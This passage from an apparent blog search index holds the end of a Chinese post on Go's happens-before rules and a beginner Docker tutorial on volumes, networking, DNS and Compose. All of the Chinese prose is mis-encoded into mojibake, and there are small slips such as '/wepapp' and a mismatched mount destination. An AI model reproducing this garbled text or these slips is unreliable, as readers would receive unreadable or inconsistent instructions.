æ‰€æœ‰çš„initå‡½æ•°\n\n\n\n3) **Goroutine**\n\n- Goroutineçš„åˆ›å»ºHappens Beforeæ‰€æœ‰æ­¤Goroutineä¸­çš„æ“ä½œ\n- Goroutineçš„é”€æ¯Happens Afteræ‰€æœ‰æ­¤Goroutineä¸­çš„æ“ä½œ\n\n\n\n **4) Channel**\n\n- å¯¹ä¸€ä¸ªå…ƒç´ çš„sendæ“ä½œHappens Beforeå¯¹åº”çš„receive å®Œæˆæ“ä½œ\n- å¯¹channelçš„closeæ“ä½œHappens Before receive ç«¯çš„æ”¶åˆ°å…³é—­é€šçŸ¥æ“ä½œ\n- å¯¹äºUnbuffered Channelï¼Œå¯¹ä¸€ä¸ªå…ƒç´ çš„receive æ“ä½œHappens Beforeå¯¹åº”çš„sendå®Œæˆæ“ä½œ\n- å¯¹äºBuffered Channelï¼Œå‡è®¾Channel çš„buffer å¤§å°ä¸ºCï¼Œé‚£ä¹ˆå¯¹ç¬¬kä¸ªå…ƒç´ çš„receiveæ“ä½œï¼ŒHappens Beforeç¬¬k+Cä¸ªsendå®Œæˆæ“ä½œã€‚å¯ä»¥çœ‹å‡ºä¸Šä¸€æ¡Unbuffered Channelè§„åˆ™å°±æ˜¯è¿™æ¡è§„åˆ™C=0æ—¶çš„ç‰¹ä¾‹\n\n\n\n**5) Lock**\n\nGoé‡Œé¢æœ‰Mutexå’ŒRWMutexä¸¤ç§é”ï¼ŒRWMutexé™¤äº†æ”¯æŒäº’æ–¥çš„Lock/Unlockï¼Œè¿˜æ”¯æŒå…±äº«çš„RLock/RUnlockã€‚\n\n- å¯¹äºä¸€ä¸ªMutex/RWMutexï¼Œè®¾n < mï¼Œåˆ™ç¬¬nä¸ªUnlockæ“ä½œHappens Beforeç¬¬mä¸ªLockæ“ä½œã€‚\n- å¯¹äºä¸€ä¸ªRWMutexï¼Œå­˜åœ¨æ•°å€¼nï¼ŒRLockæ“ä½œHappens After ç¬¬nä¸ªUnLockï¼Œå…¶å¯¹åº”çš„RUnLock Happens Before ç¬¬n+1ä¸ªLockæ“ä½œã€‚\n\n*ç®€å•ç†è§£å°±æ˜¯è¿™ä¸€æ¬¡çš„Lockæ€»æ˜¯Happens Afterä¸Šä¸€æ¬¡çš„Unlockï¼Œè¯»å†™é”çš„RLock HappensAfterä¸Šä¸€æ¬¡çš„UnLockï¼Œå…¶å¯¹åº”çš„RUnlock Happens Before ä¸‹ä¸€æ¬¡çš„Lockã€‚*\n\n```\nvar l sync.Mutex\nvar a string\nfunc f() {\n    a = \"hello, world\" // (1)\n    l.Unlock() // (2)\n}\nfunc main() {\n    l.Lock() // (3)\n    go f()\n    l.Lock() // (4)\n    print(a) // (5)\n}\n```\n\n(1) happens-before (2) happens-before (4) happens-before (5)\n\n\n\n**6) Once**\n\nonce.Doä¸­æ‰§è¡Œçš„æ“ä½œï¼ŒHappens Before ä»»ä½•ä¸€ä¸ªonce.Doè°ƒç”¨çš„è¿”å›ã€‚","tags":["golang"],"categories":["2_golangåº•å±‚"]},{"title":"dockeråŸºç¡€å…¥é—¨æ•™ç¨‹(äºŒ)","url":"%2Fp%2Fcc94e38a.html","content":"\n\n\n# 5. æ•°æ®ç®¡ç†\n\n### 5.1 æ•°æ®å·\n\n `æ•°æ®å·`Â æ˜¯ä¸€ä¸ªå¯ä¾›ä¸€ä¸ªæˆ–å¤šä¸ªå®¹å™¨ä½¿ç”¨çš„ç‰¹æ®Šç›®å½•ï¼Œå®ƒç»•è¿‡ UFSï¼Œå¯ä»¥æä¾›å¾ˆå¤šæœ‰ç”¨çš„ç‰¹æ€§ï¼š\n\n- `æ•°æ®å·` å¯ä»¥åœ¨å®¹å™¨ä¹‹é—´å…±äº«å’Œé‡ç”¨\n- å¯¹ `æ•°æ®å·` çš„ä¿®æ”¹ä¼šç«‹é©¬ç”Ÿæ•ˆ\n- å¯¹ `æ•°æ®å·` çš„æ›´æ–°ï¼Œä¸ä¼šå½±å“é•œåƒ\n- `æ•°æ®å·` é»˜è®¤ä¼šä¸€ç›´å­˜åœ¨ï¼Œå³ä½¿å®¹å™¨è¢«åˆ é™¤\n\næ³¨æ„ï¼š`æ•°æ®å·`Â çš„ä½¿ç”¨ï¼Œç±»ä¼¼äº Linux ä¸‹å¯¹ç›®å½•æˆ–æ–‡ä»¶è¿›è¡Œ mountï¼Œé•œåƒä¸­çš„è¢«æŒ‡å®šä¸ºæŒ‚è½½ç‚¹çš„ç›®å½•ä¸­çš„æ–‡ä»¶ä¼šéšè—æ‰ï¼Œèƒ½æ˜¾ç¤ºçœ‹çš„æ˜¯æŒ‚è½½çš„Â `æ•°æ®å·`ã€‚\n\n<!-- more -->\n\n### 5.2 é€‰æ‹© -v è¿˜æ˜¯ -â€“mount å‚æ•°\n\nDocker æ–°ç”¨æˆ·åº”è¯¥é€‰æ‹© `--mount` å‚æ•°ï¼Œç»éªŒä¸°å¯Œçš„ Docker ä½¿ç”¨è€…å¯¹ `-v` æˆ–è€… `--volume` å·²ç»å¾ˆç†Ÿæ‚‰äº†ï¼Œä½†æ˜¯æ¨èä½¿ç”¨ `--mount` å‚æ•°ã€‚\n\n\n\n### 5.3 åˆ›å»ºä¸€ä¸ªæ•°æ®å·\n\n```\n$ docker volume create my-vol\n```\n\n\n\næŸ¥çœ‹æ‰€æœ‰çš„ `æ•°æ®å·`\n\n```\n$ docker volume ls\n\nlocal               my-vol\n```\n\n\n\nåœ¨ä¸»æœºé‡Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯ä»¥æŸ¥çœ‹æŒ‡å®š `æ•°æ®å·` çš„ä¿¡æ¯\n\n```\n$ docker volume inspect my-vol\n[\n    {\n        \"Driver\": \"local\",\n        \"Labels\": {},\n        \"Mountpoint\": \"/var/lib/docker/volumes/my-vol/_data\",\n        \"Name\": \"my-vol\",\n        \"Options\": {},\n        \"Scope\": \"local\"\n    }\n]\n```\n\n\n\n### 5.4 å¯åŠ¨ä¸€ä¸ªæŒ‚è½½æ•°æ®å·çš„å®¹å™¨\n\n åœ¨ç”¨Â `docker run`Â å‘½ä»¤çš„æ—¶å€™ï¼Œä½¿ç”¨Â `--mount`Â æ ‡è®°æ¥å°†Â `æ•°æ®å·`Â æŒ‚è½½åˆ°å®¹å™¨é‡Œã€‚åœ¨ä¸€æ¬¡Â `docker run`ä¸­å¯ä»¥æŒ‚è½½å¤šä¸ªÂ `æ•°æ®å·`ã€‚\n\n\n\nä¸‹é¢åˆ›å»ºä¸€ä¸ªåä¸º `web` çš„å®¹å™¨ï¼Œå¹¶åŠ è½½ä¸€ä¸ª `æ•°æ®å·` åˆ°å®¹å™¨çš„ `/webapp` ç›®å½•ã€‚\n\n \n\n```\n$ docker run -d -P \\\n    --name web \\\n    --mount source=my-vol,target=/webapp \\ \t\t\t\t(ç›¸ä¼¼) # -v my-vol:/wepapp \\\n    training/webapp \\\n    python app.py\n```\n\n\n\n### 5.5 æŸ¥çœ‹æ•°æ®å·çš„å…·ä½“ä¿¡æ¯\n\nåœ¨ä¸»æœºé‡Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯ä»¥æŸ¥çœ‹ `web` å®¹å™¨çš„ä¿¡æ¯\n\n```\n$ docker inspect web\n```\n\n\n\n`æ•°æ®å·` ä¿¡æ¯åœ¨ \"Mounts\" Key ä¸‹é¢\n\n```\n\"Mounts\": [\n    {\n        \"Type\": \"volume\",\n        \"Name\": \"my-vol\",\n        \"Source\": \"/var/lib/docker/volumes/my-vol/_data\",\n        \"Destination\": \"/app\",\n        \"Driver\": \"local\",\n        \"Mode\": \"\",\n        \"RW\": true,\n        \"Propagation\": \"\"\n    }\n],\n```\n\n\n\n### 5.6 åˆ é™¤æ•°æ®å·\n\n```\n$ docker volume rm my-vol\n```\n\n\n\n`æ•°æ®å·` æ˜¯è¢«è®¾è®¡ç”¨æ¥æŒä¹…åŒ–æ•°æ®çš„ï¼Œå®ƒçš„ç”Ÿå‘½å‘¨æœŸç‹¬ç«‹äºå®¹å™¨ï¼ŒDocker ä¸ä¼šåœ¨å®¹å™¨è¢«åˆ é™¤åè‡ªåŠ¨åˆ é™¤ `æ•°æ®å·`ï¼Œå¹¶ä¸”ä¹Ÿä¸å­˜åœ¨åƒåœ¾å›æ”¶è¿™æ ·çš„æœºåˆ¶æ¥å¤„ç†æ²¡æœ‰ä»»ä½•å®¹å™¨å¼•ç”¨çš„ `æ•°æ®å·`ã€‚å¦‚æœéœ€è¦åœ¨åˆ é™¤å®¹å™¨çš„åŒæ—¶ç§»é™¤æ•°æ®å·ã€‚å¯ä»¥åœ¨åˆ é™¤å®¹å™¨çš„æ—¶å€™ä½¿ç”¨ `docker rm -v` è¿™ä¸ªå‘½ä»¤ã€‚\n\n\n\n æ— ä¸»çš„æ•°æ®å·å¯èƒ½ä¼šå æ®å¾ˆå¤šç©ºé—´ï¼Œè¦æ¸…ç†è¯·ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤\n\n```\n$ docker volume prune\n```\n\n\n\n### 5.7 æŒ‚è½½ä¸€ä¸ªä¸»æœºç›®å½•ä½œä¸ºæ•°æ®å·\n\nä½¿ç”¨ `--mount` æ ‡è®°å¯ä»¥æŒ‡å®šæŒ‚è½½ä¸€ä¸ªæœ¬åœ°ä¸»æœºçš„ç›®å½•åˆ°å®¹å™¨ä¸­å»ã€‚\n\n```\n$ docker run -d -P \\\n    --name web \\\n    # -v /src/webapp:/opt/webapp \\\n    --mount type=bind,source=/src/webapp,target=/opt/webapp \\\n    training/webapp \\\n    python app.py\n```\n\nä¸Šé¢çš„å‘½ä»¤åŠ è½½ä¸»æœºçš„Â `/src/webapp`Â ç›®å½•åˆ°å®¹å™¨çš„Â `/opt/webapp`ç›®å½•ã€‚è¿™ä¸ªåŠŸèƒ½åœ¨è¿›è¡Œæµ‹è¯•çš„æ—¶å€™ååˆ†æ–¹ä¾¿ï¼Œæ¯”å¦‚ç”¨æˆ·å¯ä»¥æ”¾ç½®ä¸€äº›ç¨‹åºåˆ°æœ¬åœ°ç›®å½•ä¸­ï¼Œæ¥æŸ¥çœ‹å®¹å™¨æ˜¯å¦æ­£å¸¸å·¥ä½œã€‚æœ¬åœ°ç›®å½•çš„è·¯å¾„å¿…é¡»æ˜¯ç»å¯¹è·¯å¾„ï¼Œä»¥å‰ä½¿ç”¨Â `-v`Â å‚æ•°æ—¶å¦‚æœæœ¬åœ°ç›®å½•ä¸å­˜åœ¨ Docker ä¼šè‡ªåŠ¨ä¸ºä½ åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œç°åœ¨ä½¿ç”¨Â `--mount`å‚æ•°æ—¶å¦‚æœæœ¬åœ°ç›®å½•ä¸å­˜åœ¨ï¼ŒDocker ä¼šæŠ¥é”™\n\n\n\nDocker æŒ‚è½½ä¸»æœºç›®å½•çš„é»˜è®¤æƒé™æ˜¯ `è¯»å†™`ï¼Œç”¨æˆ·ä¹Ÿå¯ä»¥é€šè¿‡å¢åŠ  `readonly` æŒ‡å®šä¸º `åªè¯»`ã€‚\n\n \n\n```\n$ docker run -d -P \\\n    --name web \\\n    # -v /src/webapp:/opt/webapp:ro \\\n    --mount type=bind,source=/src/webapp,target=/opt/webapp,readonly \\\n    training/webapp \\\n    python app.py\n```\n\nåŠ äº† `readonly` ä¹‹åï¼Œå°±æŒ‚è½½ä¸º `åªè¯»` äº†ã€‚å¦‚æœä½ åœ¨å®¹å™¨å†… `/opt/webapp` ç›®å½•æ–°å»ºæ–‡ä»¶ï¼Œä¼šæ˜¾ç¤ºå¦‚ä¸‹é”™è¯¯\n\n```\n/opt/webapp # touch new.txt\ntouch: new.txt: Read-only file system\n```\n\n\n\n### 5.8 æŸ¥çœ‹æ•°æ®å·çš„å…·ä½“ä¿¡æ¯\n\nåœ¨ä¸»æœºé‡Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯ä»¥æŸ¥çœ‹ `web` å®¹å™¨çš„ä¿¡æ¯\n\n```\n$ docker inspect web\n```\n\n`æŒ‚è½½ä¸»æœºç›®å½•` çš„é…ç½®ä¿¡æ¯åœ¨ \"Mounts\" Key ä¸‹é¢\n\n```\n\"Mounts\": [\n    {\n        \"Type\": \"bind\",\t\t\t#æ­¤å¤„ä¸º bind\n        \"Source\": \"/src/webapp\",\n        \"Destination\": \"/opt/webapp\",\n        \"Mode\": \"\",\n        \"RW\": true,\n        \"Propagation\": \"rprivate\"\n    }\n],\n```\n\n\n\n### 5.9 æŒ‚è½½ä¸€ä¸ªæœ¬åœ°ä¸»æœºæ–‡ä»¶ä½œä¸ºæ•°æ®å·\n\n`--mount`Â æ ‡è®°ä¹Ÿå¯ä»¥ä»ä¸»æœºæŒ‚è½½å•ä¸ªæ–‡ä»¶åˆ°å®¹å™¨ä¸­\n\n```\n$ docker run --rm -it \\\n   # -v $HOME/.bash_history:/root/.bash_history \\\n   --mount type=bind,source=$HOME/.bash_history,target=/root/.bash_history \\\n   ubuntu:17.10 \\\n   bash\n\nroot@2affd44b4667:/# history\n1  ls\n2  diskutil list\n```\n\nè¿™æ ·å°±å¯ä»¥è®°å½•åœ¨å®¹å™¨è¾“å…¥è¿‡çš„å‘½ä»¤äº†ã€‚\n\n\n\n# 6. ä½¿ç”¨ç½‘ç»œ\n\n### 6.1 å¤–éƒ¨è®¿é—®å®¹å™¨\n\nå®¹å™¨ä¸­å¯ä»¥è¿è¡Œä¸€äº›ç½‘ç»œåº”ç”¨ï¼Œè¦è®©å¤–éƒ¨ä¹Ÿå¯ä»¥è®¿é—®è¿™äº›åº”ç”¨ï¼Œå¯ä»¥é€šè¿‡ `-P` æˆ– `-p` å‚æ•°æ¥æŒ‡å®šç«¯å£æ˜ å°„ã€‚\n\nå½“ä½¿ç”¨ `-P` æ ‡è®°æ—¶ï¼ŒDocker ä¼šéšæœºæ˜ å°„ä¸€ä¸ª `49000~49900` çš„ç«¯å£åˆ°å†…éƒ¨å®¹å™¨å¼€æ”¾çš„ç½‘ç»œç«¯å£ã€‚\n\n\n\nä½¿ç”¨ `docker container ls` å¯ä»¥çœ‹åˆ°ï¼Œæœ¬åœ°ä¸»æœºçš„ 49155 è¢«æ˜ å°„åˆ°äº†å®¹å™¨çš„ 5000 ç«¯å£ã€‚æ­¤æ—¶è®¿é—®æœ¬æœºçš„ 49155 ç«¯å£å³å¯è®¿é—®å®¹å™¨å†… web åº”ç”¨æä¾›çš„ç•Œé¢ã€‚\n\n```\n$ docker run -d -P training/webapp python app.py\n\n$ docker container ls -l\nCONTAINER ID  IMAGE                   COMMAND       CREATED        STATUS        PORTS                    NAMES\nbc533791f3f5  training/webapp:latest  python app.py 5 seconds ago  Up 2 seconds  0.0.0.0:49155->5000/tcp  nostalgic_morse\n```\n\n \n\n`-p` åˆ™å¯ä»¥æŒ‡å®šè¦æ˜ å°„çš„ç«¯å£ï¼Œå¹¶ä¸”ï¼Œåœ¨ä¸€ä¸ªæŒ‡å®šç«¯å£ä¸Šåªå¯ä»¥ç»‘å®šä¸€ä¸ªå®¹å™¨ã€‚æ”¯æŒçš„æ ¼å¼æœ‰ \n\n`ip:hostPort:containerPort | ip::containerPort | hostPort:containerPort`ã€‚\n\n\n\n### 6.2 æ˜ å°„æ‰€æœ‰æ¥å£åœ°å€ \n\nä½¿ç”¨ `hostPort:containerPort` æ ¼å¼æœ¬åœ°çš„ 5000 ç«¯å£æ˜ å°„åˆ°å®¹å™¨çš„ 5000 ç«¯å£ï¼Œå¯ä»¥æ‰§è¡Œ\n\n```\n$ docker run -d -p 5000:5000 training/webapp python app.py\n```\n\næ­¤æ—¶é»˜è®¤ä¼šç»‘å®šæœ¬åœ°æ‰€æœ‰æ¥å£ä¸Šçš„æ‰€æœ‰åœ°å€ã€‚\n\n\n\n### 6.3 æ˜ å°„åˆ°æŒ‡å®šåœ°å€çš„æŒ‡å®šç«¯å£  \n\nå¯ä»¥ä½¿ç”¨ `ip:hostPort:containerPort` æ ¼å¼æŒ‡å®šæ˜ å°„ä½¿ç”¨ä¸€ä¸ªç‰¹å®šåœ°å€ï¼Œæ¯”å¦‚ localhost åœ°å€ 127.0.0.1\n\n```\n$ docker run -d -p 127.0.0.1:5000:5000 training/webapp python app.py\n```\n\n\n\n### 6.4 æ˜ å°„åˆ°æŒ‡å®šåœ°å€çš„ä»»æ„ç«¯å£\n\nä½¿ç”¨ `ip::containerPort` ç»‘å®š localhost çš„ä»»æ„ç«¯å£åˆ°å®¹å™¨çš„ 5000 ç«¯å£ï¼Œæœ¬åœ°ä¸»æœºä¼šè‡ªåŠ¨åˆ†é…ä¸€ä¸ªç«¯å£ã€‚\n\n```\n$ docker run -d -p 127.0.0.1::5000 training/webapp python app.py\n```\n\n\n\nè¿˜å¯ä»¥ä½¿ç”¨ `udp` æ ‡è®°æ¥æŒ‡å®š `udp` ç«¯å£\n\n```\n$ docker run -d -p 127.0.0.1:5000:5000/udp training/webapp python app.py\n```\n\n\n\n### 6.5 æŸ¥çœ‹æ˜ å°„ç«¯å£é…ç½®\n\n ä½¿ç”¨ `docker port` æ¥æŸ¥çœ‹å½“å‰æ˜ å°„çš„ç«¯å£é…ç½®ï¼Œä¹Ÿå¯ä»¥æŸ¥çœ‹åˆ°ç»‘å®šçš„åœ°å€\n\n```\n$ docker port nostalgic_morse 5000\n127.0.0.1:49155.\n\n```\n\n\n\n- å®¹å™¨æœ‰è‡ªå·±çš„å†…éƒ¨ç½‘ç»œå’Œ ip åœ°å€ï¼ˆä½¿ç”¨ `docker inspect` å¯ä»¥è·å–æ‰€æœ‰çš„å˜é‡ï¼ŒDocker è¿˜å¯ä»¥æœ‰ä¸€ä¸ªå¯å˜çš„ç½‘ç»œé…ç½®ã€‚ï¼‰\n- `-p` æ ‡è®°å¯ä»¥å¤šæ¬¡ä½¿ç”¨æ¥ç»‘å®šå¤šä¸ªç«¯å£\n\nä¾‹å¦‚\n\n```\n$ docker run -d \\\n    -p 5000:5000 \\\n    -p 3000:80 \\\n    training/webapp \\\n    python app.py\n```\n\n\n\n### 6.7 å®¹å™¨äº’è”\n\n+ æ–°å»ºç½‘ç»œ\n\n ä¸‹é¢å…ˆåˆ›å»ºä¸€ä¸ªæ–°çš„ Docker ç½‘ç»œã€‚\n\n```\n$ docker network create -d bridge my-net\n```\n\n`-d` å‚æ•°æŒ‡å®š Docker ç½‘ç»œç±»å‹ï¼Œæœ‰ `bridge` `overlay`ã€‚å…¶ä¸­ `overlay` ç½‘ç»œç±»å‹ç”¨äº [Swarm mode](https://yeasy.gitbooks.io/docker_practice/content/swarm_mode)\n\n\n\n+ è¿æ¥å®¹å™¨\n\nè¿è¡Œä¸€ä¸ªå®¹å™¨å¹¶è¿æ¥åˆ°æ–°å»ºçš„ `my-net` ç½‘ç»œ\n\n```\n$ docker run -it --rm --name busybox1 --network my-net busybox sh\n```\n\n\n\næ‰“å¼€æ–°çš„ç»ˆç«¯ï¼Œå†è¿è¡Œä¸€ä¸ªå®¹å™¨å¹¶åŠ å…¥åˆ° `my-net` ç½‘ç»œ\n\n```\n$ docker run -it --rm --name busybox2 --network my-net busybox sh\n```\n\n\n\nå†æ‰“å¼€ä¸€ä¸ªæ–°çš„ç»ˆç«¯æŸ¥çœ‹å®¹å™¨ä¿¡æ¯\n\n```\n$ docker container ls\n\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\nb47060aca56b        busybox             \"sh\"                11 minutes ago      Up 11 minutes                           busybox2\n8720575823ec        busybox             \"sh\"                16 minutes ago      Up 16 minutes                           busybox1\n```\n\n\n\nä¸‹é¢é€šè¿‡ `ping` æ¥è¯æ˜ `busybox1` å®¹å™¨å’Œ `busybox2` å®¹å™¨å»ºç«‹äº†äº’è”å…³ç³»ã€‚\n\nåœ¨ `busybox1` å®¹å™¨è¾“å…¥ä»¥ä¸‹å‘½ä»¤\n\n```\n/ # ping busybox2\nPING busybox2 (172.19.0.3): 56 data bytes\n64 bytes from 172.19.0.3: seq=0 ttl=64 time=0.072 ms\n64 bytes from 172.19.0.3: seq=1 ttl=64 time=0.118 ms\n```\n\n\n\nç”¨ ping æ¥æµ‹è¯•è¿æ¥ `busybox2` å®¹å™¨ï¼Œå®ƒä¼šè§£ææˆ `172.19.0.3`ã€‚\n\nåŒç†åœ¨ `busybox2` å®¹å™¨æ‰§è¡Œ `ping busybox1`ï¼Œä¹Ÿä¼šæˆåŠŸè¿æ¥åˆ°ã€‚\n\n```\n/ # ping busybox1\nPING busybox1 (172.19.0.2): 56 data bytes\n64 bytes from 172.19.0.2: seq=0 ttl=64 time=0.064 ms\n64 bytes from 172.19.0.2: seq=1 ttl=64 time=0.143 ms\n```\n\nè¿™æ ·ï¼Œ`busybox1` å®¹å™¨å’Œ `busybox2` å®¹å™¨å»ºç«‹äº†äº’è”å…³ç³»ã€‚\n\nå¦‚æœä½ æœ‰å¤šä¸ªå®¹å™¨ä¹‹é—´éœ€è¦äº’ç›¸è¿æ¥ï¼Œæ¨èä½¿ç”¨Â [Docker Compose](https://yeasy.gitbooks.io/docker_practice/content/compose)ã€‚\n\n\n\n### 6.8 é…ç½® DNS\n\n å¦‚ä½•è‡ªå®šä¹‰é…ç½®å®¹å™¨çš„ä¸»æœºåå’Œ DNS å‘¢ï¼Ÿç§˜è¯€å°±æ˜¯ Docker åˆ©ç”¨è™šæ‹Ÿæ–‡ä»¶æ¥æŒ‚è½½å®¹å™¨çš„ 3 ä¸ªç›¸å…³é…ç½®æ–‡ä»¶ã€‚\n\nåœ¨å®¹å™¨ä¸­ä½¿ç”¨ `mount` å‘½ä»¤å¯ä»¥çœ‹åˆ°æŒ‚è½½ä¿¡æ¯ï¼š\n\n```\n$ mount\n/dev/disk/by-uuid/1fec...ebdf on /etc/hostname type ext4 ...\n/dev/disk/by-uuid/1fec...ebdf on /etc/hosts type ext4 ...\ntmpfs on /etc/resolv.conf type tmpfs ...\n```\n\nè¿™ç§æœºåˆ¶å¯ä»¥è®©å®¿ä¸»ä¸»æœº DNS ä¿¡æ¯å‘ç”Ÿæ›´æ–°åï¼Œæ‰€æœ‰ Docker å®¹å™¨çš„ DNS é…ç½®é€šè¿‡ `/etc/resolv.conf`æ–‡ä»¶ç«‹åˆ»å¾—åˆ°æ›´æ–°ã€‚\n\né…ç½®å…¨éƒ¨å®¹å™¨çš„ DNS ï¼Œä¹Ÿå¯ä»¥åœ¨ `/etc/docker/daemon.json` æ–‡ä»¶ä¸­å¢åŠ ä»¥ä¸‹å†…å®¹æ¥è®¾ç½®ã€‚\n\n```\n{\n  \"dns\" : [\n    \"114.114.114.114\",\n    \"8.8.8.8\"\n  ]\n} \n```\n\n\n\nå¦‚æœç”¨æˆ·æƒ³è¦æ‰‹åŠ¨æŒ‡å®šå®¹å™¨çš„é…ç½®ï¼Œå¯ä»¥åœ¨ä½¿ç”¨ `docker run` å‘½ä»¤å¯åŠ¨å®¹å™¨æ—¶åŠ å…¥å¦‚ä¸‹å‚æ•°ï¼š\n\n `-h HOSTNAME`Â æˆ–è€…Â `--hostname=HOSTNAME`Â è®¾å®šå®¹å™¨çš„ä¸»æœºåï¼Œå®ƒä¼šè¢«å†™åˆ°å®¹å™¨å†…çš„Â `/etc/hostname`å’ŒÂ `/etc/hosts`ã€‚ä½†å®ƒåœ¨å®¹å™¨å¤–éƒ¨çœ‹ä¸åˆ°ï¼Œæ—¢ä¸ä¼šåœ¨Â `docker container ls`Â ä¸­æ˜¾ç¤ºï¼Œä¹Ÿä¸ä¼šåœ¨å…¶ä»–çš„å®¹å™¨çš„Â `/etc/hosts`Â çœ‹åˆ°ã€‚\n\n\n\n`--dns=IP_ADDRESS`Â æ·»åŠ  DNS æœåŠ¡å™¨åˆ°å®¹å™¨çš„Â `/etc/resolv.conf`Â ä¸­ï¼Œè®©å®¹å™¨ç”¨è¿™ä¸ªæœåŠ¡å™¨æ¥è§£ææ‰€æœ‰ä¸åœ¨Â `/etc/hosts`Â ä¸­çš„ä¸»æœºåã€‚\n\n\n\n`--dns-search=DOMAIN`Â è®¾å®šå®¹å™¨çš„æœç´¢åŸŸï¼Œå½“è®¾å®šæœç´¢åŸŸä¸ºÂ `.example.com`Â æ—¶ï¼Œåœ¨æœç´¢ä¸€ä¸ªåä¸º host çš„ä¸»æœºæ—¶ï¼ŒDNS ä¸ä»…æœç´¢ hostï¼Œè¿˜ä¼šæœç´¢Â `host.example.com`ã€‚\n\n\n\n> æ³¨æ„ï¼šå¦‚æœåœ¨å®¹å™¨å¯åŠ¨æ—¶æ²¡æœ‰æŒ‡å®šæœ€åä¸¤ä¸ªå‚æ•°ï¼ŒDocker ä¼šé»˜è®¤ç”¨ä¸»æœºä¸Šçš„Â `/etc/resolv.conf`Â æ¥é…ç½®å®¹å™¨ã€‚\n\n\n\n# 7. Docker Compose(ç»„æˆ) é¡¹ç›®\n\n### 7.1 Compose ç®€ä»‹\n\n`Compose`Â é¡¹ç›®æ˜¯ Docker å®˜æ–¹çš„å¼€æºé¡¹ç›®ï¼Œè´Ÿè´£å®ç°å¯¹ Docker å®¹å™¨é›†ç¾¤çš„å¿«é€Ÿç¼–æ’ã€‚\n\n\n\nåœ¨æ—¥å¸¸å·¥ä½œä¸­ï¼Œç»å¸¸ä¼šç¢°åˆ°éœ€è¦å¤šä¸ªå®¹å™¨ç›¸äº’é…åˆæ¥å®ŒæˆæŸé¡¹ä»»åŠ¡çš„æƒ…å†µã€‚ä¾‹å¦‚è¦å®ç°ä¸€ä¸ª Web é¡¹ç›®ï¼Œé™¤äº† Web æœåŠ¡å®¹å™¨æœ¬èº«ï¼Œå¾€å¾€è¿˜éœ€è¦å†åŠ ä¸Šåç«¯çš„æ•°æ®åº“æœåŠ¡å®¹å™¨ï¼Œç”šè‡³è¿˜åŒ…æ‹¬è´Ÿè½½å‡è¡¡å®¹å™¨ç­‰ã€‚\n\n\n\n`Compose` æ°å¥½æ»¡è¶³äº†è¿™æ ·çš„éœ€æ±‚ã€‚å®ƒå…è®¸ç”¨æˆ·é€šè¿‡ä¸€ä¸ªå•ç‹¬çš„ `docker-compose.yml` æ¨¡æ¿æ–‡ä»¶ï¼ˆYAML æ ¼å¼ï¼‰æ¥\tå®šä¹‰ä¸€ç»„ç›¸å…³è”çš„åº”ç”¨å®¹å™¨ä¸ºä¸€ä¸ªé¡¹ç›®ï¼ˆprojectï¼‰ã€‚\n\n \n\n`Compose` ä¸­æœ‰ä¸¤ä¸ªé‡è¦çš„æ¦‚å¿µï¼š\n\n- æœåŠ¡ (`service`)ï¼šä¸€ä¸ªåº”ç”¨çš„å®¹å™¨ï¼Œ*å®é™…ä¸Šå¯ä»¥åŒ…æ‹¬è‹¥å¹²è¿è¡Œç›¸åŒé•œåƒçš„å®¹å™¨å®ä¾‹ã€‚*\n- é¡¹ç›® (`project`)ï¼šç”±ä¸€ç»„å…³è”çš„åº”ç”¨å®¹å™¨ç»„æˆçš„ä¸€ä¸ªå®Œæ•´ä¸šåŠ¡å•å…ƒï¼Œåœ¨ `docker-compose.yml` æ–‡ä»¶ä¸­å®šä¹‰ã€‚\n\n\n\nä¸€ä¸ªé¡¹ç›®å¯ä»¥ç”±å¤šä¸ªæœåŠ¡ï¼ˆå®¹å™¨ï¼‰å…³è”è€Œæˆï¼Œ`Compose`Â é¢å‘é¡¹ç›®è¿›è¡Œç®¡ç†ã€‚\n\n\n\n### 7.2 å®‰è£…ä¸å¸è½½\n\n- `Compose` å¯ä»¥é€šè¿‡ Python çš„åŒ…ç®¡ç†å·¥å…· `pip` è¿›è¡Œå®‰è£…\n\n- ä¹Ÿå¯ä»¥ç›´æ¥ä¸‹è½½ç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶æ–‡ä»¶ä½¿ç”¨\n- ç”šè‡³èƒ½å¤Ÿç›´æ¥åœ¨ Docker å®¹å™¨ä¸­è¿è¡Œ\n\nå‰ä¸¤ç§æ–¹å¼æ˜¯ä¼ ç»Ÿæ–¹å¼ï¼Œé€‚åˆæœ¬åœ°ç¯å¢ƒä¸‹å®‰è£…ä½¿ç”¨ï¼›æœ€åä¸€ç§æ–¹å¼åˆ™ä¸ç ´åç³»ç»Ÿç¯å¢ƒï¼Œæ›´é€‚åˆäº‘è®¡ç®—åœºæ™¯ã€‚\n\n```\n$ docker-compose --version\ndocker-compose version 1.21.0, build 5920eb0\n```\n\n\n\n8.3 Compose å‘½ä»¤è¯´æ˜ä½¿ç”¨\n\nå¯¹äº Compose æ¥è¯´ï¼Œå¤§éƒ¨åˆ†å‘½ä»¤çš„å¯¹è±¡æ—¢å¯ä»¥æ˜¯é¡¹ç›®æœ¬èº«ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šä¸ºé¡¹ç›®ä¸­çš„æœåŠ¡æˆ–è€…å®¹å™¨ã€‚å¦‚æœæ²¡æœ‰ç‰¹åˆ«çš„è¯´æ˜ï¼Œå‘½ä»¤å¯¹è±¡å°†æ˜¯é¡¹ç›®ï¼Œè¿™æ„å‘³ç€é¡¹ç›®ä¸­æ‰€æœ‰çš„æœåŠ¡éƒ½ä¼šå—åˆ°å‘½ä»¤å½±å“ã€‚\n\n \n\n`docker-compose` å‘½ä»¤çš„åŸºæœ¬çš„ä½¿ç”¨æ ¼å¼æ˜¯\n\n```\ndocker-compose [-f=<arg>...] [options] [COMMAND] [ARGS...]\n```\n\n \n\nå‘½ä»¤é€‰é¡¹\n\n- `-f, --file FILE` æŒ‡å®šä½¿ç”¨çš„ Compose æ¨¡æ¿æ–‡ä»¶ï¼Œé»˜è®¤ä¸º `docker-compose.yml`ï¼Œå¯ä»¥å¤šæ¬¡æŒ‡å®šã€‚\n- `-p, --project-name NAME` 